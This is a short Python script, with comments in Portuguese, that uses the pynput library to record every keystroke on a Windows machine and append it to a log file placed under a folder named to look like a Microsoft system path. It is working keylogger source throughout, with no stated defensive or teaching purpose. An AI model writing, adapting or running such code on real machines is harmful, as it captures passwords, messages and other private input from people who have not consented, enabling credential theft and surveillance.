from pynput.keyboard import Listener
import re

logFile = "C:\Microsoft/key.log"
# Somente perfumaria
def capture(key):
	key = str(key)
	key = re.sub(r'\'', '', key)
	key = re.sub(r'Key.space', ' ', key)
	key = re.sub(r'Key.enter', '\n', key)

	with open(logFile, "a") as log:
		log.write(key)
# Define um servidor (Listener) que escuta as entradas do teclado
with Listener(on_press=capture) as zankyo:
	zankyo.join()
